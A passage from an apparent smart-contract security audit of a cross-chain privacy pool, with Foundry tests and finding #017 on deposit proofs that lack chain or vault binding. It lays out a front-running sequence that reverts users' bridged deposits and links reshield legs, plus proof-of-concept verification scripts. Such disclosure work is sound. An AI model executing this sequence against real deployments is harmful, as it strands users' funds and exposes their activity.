    poolVault.initialize(
      ROOT_HISTORY_SIZE,
      new ITransactVerifierRouter.VerifierConfig[](0),
      IASPRegistry(mockAspRegistry),
      IKeystore(mockKeystore),
      mockRagequitVerifier,
      mockDepositVerifier,
      MAX_STATE_TREE_SIZE
    );

    processor = new BridgeObserverProcessor();
    processor.configure(address(poolVault), NULLIFIER, CONTROL_NULLIFIER);

    poolVault.exposed_updateRoot(STATE_ROOT);
    poolVault.mockRootInsertion(NEW_ROOT);
    poolVault.mockRootInsertion(NEW_ROOT + 1);
    poolVault.mockTransactVerifyResult(true);
    vm.mockCall(mockKeystore, abi.encodeCall(IRootBuffer.isKnownRoot, (KEY_ROOT)), abi.encode(true));
    vm.mockCall(mockAspRegistry, LATEST_ASP_ROOT_SELECTOR, abi.encode(ASP_ROOT));

    vm.deal(address(poolVault), 100 ether);
    vm.warp(1_800_000_000);
  }

  function _params() internal view returns (IPoolVault.TransactParams memory) {
    return IPoolVault.TransactParams({processor: address(processor), data: 'reshield-crosschain'});
  }

  function _proofFor(
    uint256 _nullifier,
    uint256 _commitment
  ) internal view returns (ProofLibV2.TransactProof memory) {
    uint256[] memory _n = new uint256[](1);
    _n[0] = _nullifier;
    uint256[] memory _c = new uint256[](1);
    _c[0] = _commitment;
    return buildMockTransactProofDynamic(
      _c,
      _n,
      STATE_ROOT,
      KEY_ROOT,
      ASP_ROOT,
      AMOUNT_OUT,
      uint256(uint160(Constants.NATIVE_ASSET)),
      _params(),
      new IPoolVault.NoteData[](0)
    );
  }

  /// T1 — the burn is committed before the processor can dispatch to the bridge.
  function test_T1_NullifierBurnedBeforeBridgeDispatch() external {
    // C3 negative-ordering control: nothing burned yet.
    assertEq(poolVault.spentNullifiers(NULLIFIER), 0, 'C3: watched nullifier must start unspent');
    assertFalse(processor.bridgeDispatched(), 'C3: no dispatch yet');

    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT), _params(), new IPoolVault.NoteData[](0));

    // The observer ran inside `transact`, at PoolVault.sol:186 -> :403.
    assertTrue(processor.observed(), 'observer receive() must have run inside transact');
    assertEq(processor.receivedValue(), AMOUNT_OUT, 'processor must have been paid the withdrawal');

    // THE CLAIM: at the first instant the processor holds the value — strictly
    // before it can call the bridge — the nullifier already reads as spent.
    assertEq(
      processor.observedWatchedAt(), block.timestamp, 'LEG 1: nullifier must already be burned mid-transact'
    );

    // C1 anti-vacuity: an unrelated nullifier still reads 0 at the same instant.
    assertEq(processor.observedControlAt(), 0, 'C1: control nullifier must read unspent');

    assertTrue(processor.bridgeDispatched(), 'bridge dispatch happened after the burn');
    assertEq(processor.watchedAtDispatch(), block.timestamp, 'still burned at dispatch point');
  }

  /// T2 — the note is thereafter unspendable: replay reverts.
  function test_T2_NoteUnspendableAfterBurn() external {
    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT), _params(), new IPoolVault.NoteData[](0));
    assertEq(poolVault.spentNullifiers(NULLIFIER), block.timestamp, 'precondition: burned');

    vm.expectRevert(IPoolVault.PoolVault_NullifierAlreadySpent.selector);
    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT_2), _params(), new IPoolVault.NoteData[](0));
  }

  /// C2 mutation control — the revert in T2 is caused by the burn, not by an
  /// unrelated invariant: an identical call with a fresh nullifier succeeds.
  function test_C2_MutationControl_FreshNullifierStillSpendable() external {
    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT), _params(), new IPoolVault.NoteData[](0));
    assertEq(poolVault.spentNullifiers(FRESH_NULLIFIER), 0, 'C2: fresh nullifier unspent');

    processor.runReshieldLeg(_proofFor(FRESH_NULLIFIER, COMMITMENT_2), _params(), new IPoolVault.NoteData[](0));
    assertEq(poolVault.spentNullifiers(FRESH_NULLIFIER), block.timestamp, 'C2: fresh nullifier now burned');
  }

  /// T3 — irreversibility: no external entry point restores a burned nullifier.
  ///  Brute-forces every 4-byte selector reachable on the vault would be
  ///  infeasible; instead assert the two documented state-changing entry points
  ///  that touch `spentNullifiers` (`transact`, `ragequit`) only ever SET it,
  ///  and that the value survives a failed replay.
  function test_T3_BurnSurvivesFailedReplay() external {
    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT), _params(), new IPoolVault.NoteData[](0));
    uint256 _burnedAt = poolVault.spentNullifiers(NULLIFIER);
    assertGt(_burnedAt, 0);

    vm.warp(block.timestamp + 7 days); // the bridge "never delivers" window
    try processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT_2), _params(), new IPoolVault.NoteData[](0)) {
      revert('replay unexpectedly succeeded');
    } catch {}

    assertEq(poolVault.spentNullifiers(NULLIFIER), _burnedAt, 'burn is permanent and unchanged 7 days later');
  }

  /// T4 — the source chain asserts nothing about the terminal hop: `transact`
  ///  completes and returns control with `amountOut` in the processor's hands,
  ///  with no vault-side record of a destination outcome. Encoded as: the vault
  ///  holds no post-condition on where the processor sends the value.
  function test_T4_VaultKeepsNoDestinationPostcondition() external {
    uint256 _vaultBefore = address(poolVault).balance;
    processor.runReshieldLeg(_proofFor(NULLIFIER, COMMITMENT), _params(), new IPoolVault.NoteData[](0));

    // Value left the vault; the processor may now do anything with it.
    assertEq(address(poolVault).balance, _vaultBefore - AMOUNT_OUT);
    assertEq(address(processor).balance, AMOUNT_OUT);
    // And the burn stands regardless.
    assertEq(poolVault.spentNullifiers(NULLIFIER), block.timestamp);
  }
}
```

The destination half is not executed. `packages/swaps/contracts/test/RelaySwapsB2DestFork.t.sol` holds three tests, `test_B2_DestFork_FullDelivery_DepositLands`, `test_B2_DestFork_ShortDelivery_FundsToFallback` and `test_B2_DestFork_RejectsNonEndpointCaller`. All three are gated on `vm.envOr("B2_DEST_FORK_RPC_URL", string(""))` in `setUp` and call `vm.skip` when it is unset, and none of them ran. The two that matter record the repository's own expectation of LiFi receiver semantics rather than observed output. The full-delivery test asserts that the vault receives the proven note value, the `Entrypoint` keeps the vetting fee, and the leftover above `totalDepositCost` reaches the payload receiver. The short-delivery test sets `delivered = fx.totalDepositCost - 1` and asserts the vault receives nothing while the entire delivered amount reaches the payload receiver, with nothing reverting. Its own comment states that this is an expectation:

> Short delivery (below the deposit cost): the deposit cannot be paid ... Expected per LiFi receiver semantics: the failed destination call is caught and the raw USDC is sent to the payload receiver (the fallbackAddress path) ... NOT stranded, NOT reverted.

A destination call that reverts while holding adequate funds is covered by no test in the repository, so no redirect semantics are asserted for that shape. `ReceiverStargateV2` appears in no Solidity file in the tree other than that one test, so LiFi's receiver is not vendored here and cannot be read directly. Whether LiFi's executor catches a failed compose and forwards, or reverts and lets LayerZero retry, is the single unresolved question in this finding, and one fork run with `B2_DEST_FORK_RPC_URL` set and the calldata fixture re-captured would settle it. The measured leak and the rescue floor stand independently of that answer.

#### Recommendation

We recommend binding the destination receiver before the calldata is proof-bound, and the cheapest form of that is already written in this repository: `PoolSessionReshieldCrosschain` should query LiFi's `CalldataVerificationFacet` the way `assertRecipientIsEmbeddedInQuote` already does on the withdraw path, decoding the route with `extractMainParameters` and requiring the receiver it returns to equal `effectiveFallbackAddress`. The facet is available everywhere this flow runs: reading `facetAddress(0xee0aa320)`, the selector for `extractMainParameters(bytes)`, on the LiFi Diamond at `0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE` returns `0x7A5c119ec5dDbF9631cf40f6e5DB28f31d4332a0` on Ethereum mainnet, Optimism, Arbitrum One and Base, with identical runtime code on all four. The reshield session already holds that Diamond address and already makes source-chain read calls on this path, since `assertLiFiAddressAllowed` reads `approvedRouters` for both `quote.transactionTo` and `quote.approvalAddress` before the quote is accepted, so the facet query adds a check rather than new infrastructure; the compose payload is in hand too, without any extra call, because `decodeStargateDestBudget` in `StargateCalldata.ts` already runs `decodeFunctionData` against the full `StargateFacetV2` ABI and its `STARGATE_DATA_COMPONENTS` declare `composeMsg` inside `sendParams` alongside the `minAmountLD` the function currently returns. On the contract side, add `require(_r.fallbackAddress != address(0), RelaySwaps_ZeroFallbackAddress())` beside the three sibling zero-address checks in `RelaySwaps.execute`, which already cover `swapTarget`, `approvalAddress` and `dustRecipient`: `dustRecipient` sits one field below `fallbackAddress` in `SwapRouting` and is guarded, `fallbackAddress` is not, and the SDK already treats a zero `fallbackAddress` as unacceptable, throwing `InvalidTransactParams` from both `estimateReshieldCrosschainAmount` and `prepareReshieldCrosschainQuote` with the message "fallbackAddress must not be the zero address (bridged funds would be unrecoverable on a failed destination deposit)". The ask is to make the field load-bearing, not to remove it from `SwapRouting`, which it cannot be, because the tuple's encoding feeds the proof context hash.

We also recommend two changes around the remainder itself and one in the documentation. Replace the flat $2 `minWorthUsdMicros` placeholder with per-chain values derived from `packages/swaps/scripts/dust-rescue-cost-matrix.ts`, or give `BELOW_THRESHOLD` a non-terminal variant that accumulates leftovers for one recipient across runs, so that a rescue can eventually clear a real cost floor instead of terminating below a placeholder on every reshield the protocol has so far recorded. A non-terminal variant needs its own limits, because on the measurements above every leftover the protocol has produced would enter it: the accumulating set should carry a hard cap on the number of live entries and an age-out that retires an entry which has not reached the floor within a fixed window, and it should be walked in a fixed order that a caller cannot influence, so that a state every sub-$2 leftover joins cannot grow without bound. The remainder should also be visible where the user decides, since the `ReshieldCrosschainEstimate` a caller gets back carries `feeAmount`, `netSwapAmount`, `estimatedOutput`, `estimatedMinOutput`, `noteValue`, `vettingFee` and `totalDepositCost` and no destination-leftover line item, so a charge worth 33 to 49 bps never reaches the person paying it. Finally, document the ordering: the Cross-Chain Failure Taxonomy in `docs/tech-design/sdk/withdraw-and-swap.md` enumerates its three failure legs without stating that the nullifier is already permanently spent when any of them fires, and the `SwapRouting` NatSpec in `RelaySwaps` says output delivery "is verified elsewhere (Entrypoint.deposit revert / LiFi destination executor)" when on the cross-chain leg nothing in this repository performs that verification.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #017 — `PoolVault.deposit` accepts a proof bound to no chain and no vault, so one proof verifies in every deployment

**Severity:** Medium · **Location:** `packages/contracts/src/contracts/PoolVault.sol` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PERM · **Root cause:** RC-04 (2 findings) · **Status:** Open

#### Description

A deposit into the pool hands the vault a zero-knowledge proof together with an encrypted note payload: the proof shows that the new note was formed correctly without revealing what is in it, the vault verifies it, records the note's commitment, and the money is shielded from then on. The same contracts run on several chains, and each deployment is a separate pool with its own funds and its own notes. A cross-chain reshield joins two of them, burning a note on one chain, bridging the money, and redepositing it on another; because the holder has no wallet on the destination chain, the destination chain's deposit proof is built in advance and carried inside the source-chain transaction, where the bridge collects it and executes it on arrival.

That proof therefore sits in public source-chain calldata, complete and ready to submit, for as long as the bridge takes to deliver. Anyone can copy those bytes and send them to the destination pool first, and the vault's guard against a repeated deposit is that a commitment may be created only once, so once someone else's copy lands the holder's own deposit reverts on arrival. There is no second attempt: the source note is already burned, the money is already on the bridge, and it falls through to the fallback address the route was configured with, which the SDK defaults to the relayer's own.

**Where it breaks.** A deposit proof says nothing about which deployment it was made for, and every deployment accepts it. Two things that should agree do not:

- what the proof commits to: the encrypted note payload, and nothing besides; no chain id, no vault address and no deployment identity anywhere in the circuits' public signals or in the contract's context preimage;
- what the vault requires before it accepts one: that same payload match, a proof verification whose key every deployment shares, and a commitment not already used in this vault.

The SDK knows the binding is missing and substitutes for it in TypeScript, comparing the deposit's target address against the destination chain's Entrypoint before it builds the quote, because the proof itself cannot be asked where it belongs.

So whether a reshield completes is left to whoever else is reading the chain, and the same publication costs privacy unconditionally, because the destination note's commitment and the ciphertexts that travel with it appear on the source chain in every reshield, joining the two legs of an operation whose entire purpose is that they not be joinable.

In the `PoolVault` contract, the `deposit` function verifies a Groth16 proof and then binds it to exactly one thing.

Groth16 verification is a pure function of two inputs, the verifying key derived from the compiled circuit at trusted setup and the public signals the prover exposes. It reads no chain state, no block number and no property of the contract running it, so bytes that verify once verify anywhere the same verifying key is deployed. Proof systems answer that with domain separation, mixing the place a proof is meant for, typically the chain id and the verifying contract's address, into something the proof commits to, so a proof made for vault A on chain X fails on vault B on chain Y.

This protocol has one field that could carry such an identifier. Two of its three circuits, `deposit` and `transact`, expose a public signal named `context` that the contract recomputes and requires the proof's value to match; `ragequit` exposes none at all. In `PoolVault.deposit` the binding is computed like this:

```solidity
// PoolVault.deposit
require(
  _proof.context() == uint256(keccak256(abi.encode(_noteData))) % SNARK_SCALAR_FIELD,
  PoolVault_ProofContextMismatch()
);
```

`SNARK_SCALAR_FIELD` is the prime the circuit's arithmetic runs modulo, and `_noteData` is the encrypted note payload handed in alongside the proof, so a depositor cannot swap one note blob for another. `_noteData` carries no information about where the deposit is happening, and `PoolVault.transact` computes the same binding over `_transactParams` and `_noteData` and nothing else. Neither preimage names a chain or a vault, so neither proof is domain-separated; commitments and nullifiers live in per-vault storage, so the same commitment can be created once in every deployment and the same nullifier spent once in every deployment.

Because the absence of a domain identifier is a negative claim, here is what was searched. A recursive grep for `block.chainid` over `packages/contracts/src/` returns zero hits; case-insensitive `chainid` over the same tree returns one, a `Keystore` comment describing the `SET_AUTH_POLICY_TYPEHASH` EIP-712 domain separator, which binds `chainId` and `verifyingContract` for key-registration signatures and has nothing to do with proofs; the same grep over every `.circom` file under `packages/circuits/circuits/` returns zero. Source greps alone cannot settle it, since an identifier could enter through an include or a constant folded at compile time, so the check was repeated on each circuit's compiled `.sym` symbol table and `groth16_vkey.json`. Across all 27 committed circuits, 311 public signals and 3,383,592 signals in total, the complete set of distinct public-signal names is `amountOut`, `associationSetRoot`, `commitment`, `context`, `keystoreRoot`, `label`, `nullifierHash`, `nullifierHashes`, `outputCommitment`, `outputCommitments`, `ownerAddress`, `stateRoot`, `tokenId`, `tokenIdOut` and `value`. One signal, or one preimage term, denoting a chain id, a vault address, a deployment instance or a circuit version would have falsified the claim. There are none.

What separates two deployments today is not domain separation but freshness. On the spend path, `PoolVault._validateAndVerify` requires the proof to name three Merkle roots that the target deployment currently recognises:

```solidity
// PoolVault._validateAndVerify
require(isKnownRoot(_proof.stateRoot()), PoolVault_UnknownStateRoot());
require($.keystore.isKnownRoot(_proof.keyRegistryRoot()), PoolVault_UnknownKeystoreRoot());
require(_proof.associationSetRoot() == $.aspRegistry.latestASPRoot(), PoolVault_InvalidASPRoot());
```

All three read this instance's own storage or its own configured dependency, so as checks they are instance-local; whether the values they compare against are unique to an instance is a separate question, and two of the three are not. The state root is unique because every leaf that advances the vault's ring buffer, `COMMITMENT_LEAF_TAG` and `NULLIFIER_LEAF_TAG` alike, carries `block.timestamp` as its third `PoseidonT4` input, so two vaults operating independently will not arrive at the same root. The keystore root is not: the leaf `Keystore._setAuthPolicy` commits is `PoseidonT4.hash([uint256(uint160(_account)), _nullifyingKeyHash, _authDigest])`, carrying no chain id, no keystore address and no timestamp, and the tree is an append-only lean incremental Merkle tree, a LeanIMT, whose root with a single leaf is that leaf itself, so the same accounts registering the same keys in the same order on two chains produce byte-identical keystore roots. The association set root is not either: `ASPRegistry.latestASPRoot` returns whatever the operator last published and the vault tests it by exact equality, so one provider publishing one set to two chains yields the same value on both, by design. Cross-instance separation on the spend path rests on a salting decision inside the state tree rather than on anything deliberately domain-separated.

The `deposit` path has none of the three. `_validateAndVerify` occurs twice in `packages/contracts/src/`, its own definition and a single call inside `PoolVault.transact`; a second call site on the deposit path would falsify that, and there is not one. Deposits prove membership in no tree, because a deposit creates a new note rather than spending one, so there is nothing to be fresh against, and a deposit proof is accepted on three things: the Groth16 verification, the `_noteData` context match above, and the `_commitmentExists` guard raising `PoolVault_CommitmentAlreadyUsed()` if that commitment was already created in this vault. Verifier bytecode is shared across every deployment through the `verifiers/=../circuits/build/` remapping in `packages/contracts/remappings.txt`, so every deployment runs the same verifying key and a deposit proof is portable to any deployment that enables the same token address.

That portability would stay latent if deposit proofs never left the chain they were made for. They do leave it, in the product's advertised cross-chain reshield, which withdraws from the pool on one chain and deposits back into the pool on another as one user operation with a bridge in between, and which requires the user to build the destination deposit proof in advance. The `depositResult` field of `PrepareReshieldCrosschainQuoteParams` is documented in the SDK as the "result of a deposit proof prepared against the destination chain's Entrypoint (i.e. a `PoolSession` scoped to `toChainId`, not this session's own `chainId`)", and `prepareReshieldCrosschainQuote` passes that result's `callData` and `to` into `getSwapAndDepositQuote` as `depositCalldata` and `poolAddress`, where `LiFiSwapQuoteProvider.getSwapAndDepositQuote` asks the bridge aggregator to execute them as a contract call on the destination chain:

```ts
// LiFiSwapQuoteProvider.getSwapAndDepositQuote
contractCalls: [
    {
        fromAmount: params.depositAmount,
        fromTokenAddress: params.toToken,
        toContractAddress: params.poolAddress,
        toContractCallData: params.depositCalldata,
        toContractGasLimit: params.depositGasLimit ?? "300000",
    },
],
```

The blob the aggregator returns becomes `swapCalldata` inside `SwapRouting`, which is ABI-encoded into `_transactParams.data`, decoded back out by `abi.decode(_transactParams.data, (SwapRouting))` in `RelaySwaps.execute`, and hashed into the source-chain `context` by `PoolVault.transact`. `assertDepositIsEmbeddedInQuote` confirms the arrangement rather than leaving it to inference, requiring the aggregator's returned `transactionData` to contain the deposit calldata and the destination Entrypoint address verbatim at the byte level. A complete, anchor-free, destination-chain deposit proof is therefore published inside a public source-chain transaction and sits there for as long as the bridge takes to deliver, so the attacker's window is bridge latency, usually minutes, rather than a race for the next block.

Anyone can use that window, because the destination deposit entry point is open. Users call `Entrypoint.deposit`, which validates the asset configuration, takes the per-asset vetting fee and forwards to the vault, and which is `external payable` with no access modifier and no allowlist. `PoolVault.deposit` does carry `checkAccess(DEPOSITOR_ROLE)`, but the deploy script grants that role to the Entrypoint with `_accessRouter.grantRole(DEPOSITOR_ROLE, address(_deployment.entrypoint))`, so the gate is satisfied for any caller by proxy. The sequence is:

1. The user's source-chain reshield transaction lands, its calldata carrying the destination `Entrypoint.deposit(...)` bytes.
2. Anyone reads those bytes out of the transaction, with no privilege and no special access.
3. The attacker submits the same bytes unchanged to the destination chain's `Entrypoint.deposit`, paying out of their own funds the `_amountPlusFees` that function computes from `_value` and `FeeCalculator.calcFee`. It succeeds, and `PoolVault.deposit` records the commitment.
4. The bridge delivers and the aggregator executes the identical calldata. The `require(!_commitmentExists(_commitment), PoolVault_CommitmentAlreadyUsed())` in `PoolVault.deposit` now reverts, so the user's own leg fails.
5. The bridged funds fall through to the fallback address the quote was configured with.

The funds movement was traced, and it does not favour the attacker:

| party | delta |
| --- | --- |
| attacker | pays `_value` plus the vetting fee and receives nothing; the commitment they funded belongs to the note owner, because the proof is the note owner's |
| note owner | source nullifier already spent; ends up holding a valid destination note worth `_value` that the attacker paid for; loses the bridged principal |
| holder of the fallback address, the relayer by default | receives the bridged principal |

`estimateReshieldCrosschainAmount` computes `totalDepositCost` as `noteValue + vettingFee` and the bridged amount is sized to cover it, so the note owner's gain and loss roughly cancel and the attacker's profit is strictly negative. This is not a drain; what the attacker buys is the reverted operation and the linkage described below. One caveat on the last row of that table: what the bridge aggregator does with the principal once the destination call reverts is the aggregator's behaviour rather than this protocol's, and it was not verified against a live route or a destination trace. The row rests on the repository's own statement of those semantics, namely that `getSwapAndDepositQuote` sets the quote's `toFallbackAddress` from `params.fallbackAddress`, that `estimateReshieldCrosschainAmount` and `prepareReshieldCrosschainQuote` both default `effectiveFallbackAddress` to the relayer's own address and reject an explicit zero, and that the comment beside that default states a zero fallback would tell the aggregator "to send bridged tokens to the burn address if the destination deposit cannot execute".

The same transport leaks with no attacker at all. The destination commitment, its encrypted note payload and its association-set ciphertext, the encrypted label the compliance registry records alongside a deposit, are all published on the source chain before they exist on the destination, so a source-chain observer learns which destination note the user is about to create and can join the two legs of the reshield by construction, in normal operation. Unlinking those two legs is the reason cross-chain reshielding exists.

The SDK's own guard is the best corroboration available in the repository. `prepareReshieldCrosschainQuote` compares `depositResult.to` against `destinationEntrypointInteractor.getAddress()` and throws `DestinationDepositTargetMismatch`, whose message reads "Reshield-crosschain `depositResult.to` ... is not chain `toChainId`'s Entrypoint, funds would be delivered to a non-pool contract". That a deposit proof must be aimed at one specific deployment is already understood and already enforced, by address comparison in TypeScript, because the proof itself does not carry the binding.

Two live `PoolVault` instances, the ones named in `_arbitrumDeployment()` and `_baseDeployment()`, were confirmed on chain, and native ETH is enabled with `vettingFeeBPS: 0` in both `_arbitrumAssets()` and `_baseAssets()`, so both accept the same asset at the same identifier; `_mainnetDeployment()` still reverts with "mainnet not deployed yet". The second live instance a cross-instance spend replay would need therefore exists, but that is necessary and not sufficient, since such a replay needs all three freshness anchors to coincide and the timestamp-salted state root will not. We do not claim spend replay is reachable at this commit; the deposit path above is live independently of it.

One documentation item travels with this finding. The project's own cryptography glossary defines the asset identifier as including the chain id. Its `tokenId` entry reads, verbatim:

> A unique identifier for each asset type in the protocol. (`keccak256(abi.encode(token_address, chainId, [nftId])) % SNARK_SCALAR_FIELD`)

and its `chainId` entry reads:

> The network identifier. Included in `tokenId` computation to prevent cross-chain collision attacks.

The implementation is a bare 160-bit token address: `Transact.circom` range-checks the `tokenId` signal with `Num2Bits(160)`, and `ProofLibV2.tokenIdOut` rejects any value with bits above 160 set before casting it to `address`. The circuits technical design document describes the signal the way the code implements it, declaring `signal input tokenId;` with the comment `uint256(tokenAddress)` in each of its four circuit interface listings. The code and one document agree and the glossary disagrees with both, so this is an inconsistency between two documents rather than independent evidence of a missing guarantee. It matters because a reader working from the glossary will believe a cross-chain collision control is in place when it is not.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L105-L122
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L352-L372
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L202-L214
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/LiFiSwapQuoteProvider.ts#L180-L189
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L57-L61
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Transact.circom#L278-L285

#### Impact

The reachable effect is availability on a path that has already spent the user's money. By the time the destination deposit reverts, the source-chain spend has nullified the input notes and the principal has left the pool, so the user cannot retry with the same proof and cannot recover the bridged funds through any contract in this repository. Every production asset row in `ChainAssetRegistry` ships `minAmount: 1`, one base unit, so nothing filters out the small end of it, and the attacker's outlay is bounded only by the size of the reshield they target. There is no on-chain detection either: the deposit the attacker submits is indistinguishable from a legitimate one, and the only anomaly a monitor could key on is a `PoolVault_CommitmentAlreadyUsed()` revert arriving from the bridge executor after the fact. That path costs the attacker their own capital and returns nothing, so its effect is griefing and disclosure rather than value extraction.

The privacy effect is larger and needs no attacker. Publishing the destination commitment, its note payload and its association-set ciphertext in source-chain calldata joins the two legs of every reshield for anyone reading the chain. For a pool whose product is unlinkability, an unconditional join key published in normal operation is the more serious of the two effects, and it applies to every cross-chain reshield rather than only to targeted ones.

The third effect is what the omission costs in future flexibility. The path that would move value is the cross-instance spend replay, and it stays shut only because of the state root's timestamp salt, a property no document names as a security control and no test asserts. A tree seeded from a snapshot, a state migration, a deployment bootstrapped from another's leaves, or a second vault for the same asset on one chain would each remove that accidental barrier with no other code change, and the two live instances on Arbitrum and Base mean the population such a change would apply to already exists.

#### Proof of concept

Three checks were executed against this commit, and the two artifact checks were re-run while writing this up rather than taken on report. The sweep below is `domain-tag-sweep.py`, run from any directory as `python3 domain-tag-sweep.py <path to the repository root>`; against this commit it sweeps 3,383,592 signals across the 27 compiled circuits, finds 311 public signals under 15 distinct names, and reports no deployment-identifier match and no vkey-to-symbol-table inconsistency.

The first proves and verifies a deposit proof end to end (the accompanying `deposit-replay-check.mjs`, snarkjs 0.7.5). It reads a witness file, a recorded set of values for every signal in the circuit, from `packages/circuits/build/deposit`, generates a proof from it and the committed proving key in that directory, then verifies the proof against the committed `groth16_vkey.json`. One point of precision about that witness, since the rest of the check rests on it: witness files are not shipped in the repository. `.gitignore` excludes `packages/circuits/build/**/*.wtns`, and the file the run consumed, `proof_witness_56919.wtns`, was produced by the project's own proof helper `packages/contracts/test/helper/proof-utils.mjs`, which writes `proof_witness_<pid>.wtns` from the committed circuit wasm before proving and deletes it afterwards. The witness is therefore real proving data generated by the project's own tooling rather than a hand-built input, but it is generated, not committed; the proving key, the verifying key and the `.sym` symbol table that both artifact checks consume are committed. Output: `nPublic=4`; public signals `[outputCommitment, tokenId, value, context]`; `groth16.verify(...) = true`; repeated with identical inputs, `true` again; and `tokenId` at 159 bits, so a bare EVM address rather than `keccak(addr, chainId) % p`. Verification consumed the verifying key, the public signals and the proof, and nothing else. If it had consumed any argument carrying a chain id, a vault address or a deployment identity, deposit-proof portability would have died there, and it did not.

`deposit-replay-check.mjs`, which drives the prove-and-verify round trip described above:

```js
/**
 * deposit-replay-check - leg 3 direct check.
 *
 * QUESTION: is a deposit proof accepted by an arbitrary deployment?
 *
 * PoolVault.deposit (PoolVault.sol:97-134) accepts iff ALL of:
 *  (a) $.depositVerifier.verify(_proof)                                 <- pure Groth16
 *  (b) _proof.context() == keccak256(abi.encode(_noteData)) % SNARK_P   <- PoolVault.sol:105-108
 *  (c) !_commitmentExists(_proof.outputCommitment())                    <- PoolVault.sol:121
 * `_validateAndVerify` is NOT called on this path (only call site is :152, inside transact),
 * so there is no state/keystore/ASP root anchor at all.
 *
 * This script EXECUTES (a) end-to-end with the committed artifacts: it proves from the
 * committed witness + proving key, then verifies against the committed verifying key --
 * the same vkey every deployment gets, since remappings.txt:16 maps verifiers/ straight
 * into ../circuits/build/. It then enumerates every input the verification consumed.
 *
 * FALSIFIER: if groth16.verify took ANY argument carrying chain id, pool address, or
 * deployment identity, deposit proofs would not be portable and leg 3's deposit path dies.
 * Verification takes exactly (vkey, publicSignals, proof) -- so if it returns true here it
 * returns true on every deployment, byte for byte.
 */
const snarkjs = (await import(process.argv[3])).default ?? (await import(process.argv[3]));
import fs from "fs";
import path from "path";

const B = process.argv[2];
const d = path.join(B, "packages/circuits/build/deposit");
const wtns = fs.readdirSync(d).find((f) => f.endsWith(".wtns"));
if (!wtns) { console.log("no committed witness; cannot execute"); process.exit(2); }
console.log("committed witness:", wtns);

const vkey = JSON.parse(fs.readFileSync(path.join(d, "groth16_vkey.json")));
console.log(`vkey: protocol=${vkey.protocol} curve=${vkey.curve} nPublic=${vkey.nPublic} IC=${vkey.IC.length}`);

const { proof, publicSignals } = await snarkjs.groth16.prove(
  path.join(d, "groth16_pkey.zkey"), path.join(d, wtns));

// deposit main public order: [outputCommitment, tokenId, value, context]
const names = ["outputCommitment", "tokenId", "value", "context"];
console.log("\npublic signals actually produced:");
publicSignals.forEach((s, i) => console.log(`  [${i}] ${names[i]}=${s}`));

const ok = await snarkjs.groth16.verify(vkey, publicSignals, proof);
console.log("\ngroth16.verify(vkey, publicSignals, proof) =", ok);

// Verification is deterministic and stateless: repeat it to show no hidden context.
const again = await snarkjs.groth16.verify(vkey, publicSignals, proof);
console.log("re-verified with identical inputs          =", again);

const tokenId = BigInt(publicSignals[1]);
console.log("\ntokenId as uint256 :", tokenId.toString());
console.log("tokenId bit length :", tokenId.toString(2).length, "(<=160 => bare EVM address, not keccak(addr,chainId)%p)");
console.log("fits in 160 bits   :", tokenId < (1n << 160n));

console.log("\ninputs consumed by verification: vkey(committed, identical per remappings.txt:16),");
console.log("publicSignals(above), proof. Deployment-identifying inputs: NONE.");
console.log("\nRESULT:", ok && again
  ? "deposit proof verifies as a pure function of committed artifacts -> portable to any deployment"
  : "verification failed -- claim not established");
```

The second sweeps the compiled circuits (the accompanying `domain-tag-sweep.py`). Across all 27 circuits that ship a committed verifying key it asserts that the key's `IC` length equals `nPublic + 1`, which is the consistency condition for a Groth16 key and guards against the artifacts disagreeing with each other; it enumerates the public-signal set from the `.sym` symbol table; and it matches every signal name in the flattened circuit against `chain|pool|vault|domain|version|instance|nonce|deploy|network|separator`. Result: no key or symbol-table inconsistencies, 3,383,592 signals swept, zero matches.

`domain-tag-sweep.py`, which drives that sweep:

```python
#!/usr/bin/env python3
"""domain-tag-sweep - direct check.

The finding makes a NEGATIVE claim: no proof in this protocol carries a chain,
pool-instance, or circuit-version tag. Grepping .circom SOURCE cannot settle a
negative claim -- a tag could enter through an include, a template parameter, or
a constant folded at compile time.

The compiled artifacts CAN settle it. circom emits a .sym symbol table listing
every signal in the fully-flattened circuit as `#signal,#witness,#component,name`.
Signals with witness index 1..nPublic are exactly the public signals of the
proof statement (nPublic read from the committed groth16_vkey.json).

So this script, over all 27 committed circuits:
  1. reads nPublic from groth16_vkey.json and asserts IC length == nPublic+1
     (a Groth16 vkey has one IC point per public signal plus one constant term --
     if these disagree the artifacts are inconsistent and the sweep is void);
  2. enumerates the COMPLETE public-signal name set from the .sym;
  3. sweeps EVERY signal in the flattened circuit (not just public ones) for any
     name matching a deployment-identifier pattern.

FALSIFIER: any public signal, or any internal signal feeding one, whose name
denotes a chain id, pool/vault address, deployment instance, or circuit version.
A single hit refutes the finding. Zero hits across 27 circuits confirms it at the
compiled-artifact level, which is strictly stronger than a source grep.
"""
import json, re, sys
from pathlib import Path

BUILD = Path(sys.argv[1] if len(sys.argv) > 1 else ".") / "packages/circuits/build"
PAT = re.compile(r"chain|pool|vault|domain|version|instance|nonce|deploy|network|separator", re.I)

circuits = sorted(p.parent for p in BUILD.glob("*/groth16_vkey.json"))
print(f"circuits with committed vkey: {len(circuits)}\n")

